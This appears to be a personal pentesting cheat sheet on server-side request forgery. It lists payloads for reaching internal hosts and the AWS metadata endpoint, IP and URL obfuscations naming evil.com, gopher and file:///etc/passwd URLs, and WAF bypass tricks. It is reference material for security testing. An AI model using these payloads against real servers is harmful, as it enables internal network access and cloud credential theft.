?url=ssrf

2 types : regular,blind

http//:api => admin
http//:api => 192.168.0.x:8080/admin : intruder l9ina x 

blacklist : localhost=127.0.0.1=127.1=.......
do not forget url encoding

open redirection 

?URL= file:///, dict://, ftp://, gopher://

##### amazing resource : 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

# 📡 SSRF (Server-Side Request Forgery) 

## 🔍 What is SSRF?

SSRF occurs when an attacker tricks a server into making HTTP requests on their behalf. This can lead to : 

- Internal network access (e.g. `localhost`, `127.0.0.1`)

- Access to cloud metadata (`169.254.169.254`)

- Port scanning internal services

- Possible Remote Code Execution (RCE) in some cases


## ✅ SSRF Test Payloads

  

- 127.0.0.1
- localhost
- 169.254.169.254           # AWS Metadata
- [::1]                     # IPv6 localhost
- 0.0.0.0
- 2130706433                # Decimal (127.0.0.1)
- 0177.1                    # Octal (127.0.0.1)
- 127.1
- 12130706433          # Decimal
- 0x7f000001          # Hex
- 0177.0.0.1          # Octal
- 127.000.000.001     # Padded
- 127.0.1
- [::ffff:127.0.0.1]        # IPv6-mapped IPv4
- [::]
- [0000::1]
- [0:0:0:0:0:ffff:127.0.0.1]
- [::ffff:127.0.0.1]


### ✅ DNS Tricks : 

- localhost.localdomain

- localhost.bypass.com

- 127.0.0.1.nip.io

- 127.0.0.1.xip.io

### ✅ URL Obfuscation : 

- 127.0.0.1#evil.com

- 127.0.0.1@evil.com

- evil.com@127.0.0.1

- localhost%00.evil.com

- localhost%2f@evil.com

- 127.0.0.1%2F..            



### ✅ Protocol Confusion


- gopher://127.0.0.1:3306/_DATA

- ftp://127.0.0.1

- file:///etc/passwd

- dict://127.0.0.1
  
---

## 🔥 SSRF to AWS Metadata

- 169.254.169.254/latest/meta-data/

- [::ffff:169.254.169.254]/latest/meta-data/

- 0xA9FEA9FE                # Decimal of 169.254.169.254
---

  

## ⚠️ WAF Bypass Ideas : 



- URL encoding     : `localhost%2f..%2fadmin`          

-  Case variation     : `LOcaLhOst`, `MetA-Data`               

-  Null bytes          : `localhost%00.example.com`             

- Host header abuse    :  Add `Host: 127.0.0.1` in SSRF requests  


---

  
- Combine SSRF with open redirect or DNS rebinding to enhance impact.

- SSRF can lead to RCE if targeting internal services .
---



https://highon.coffee/blog/ssrf-cheat-sheet/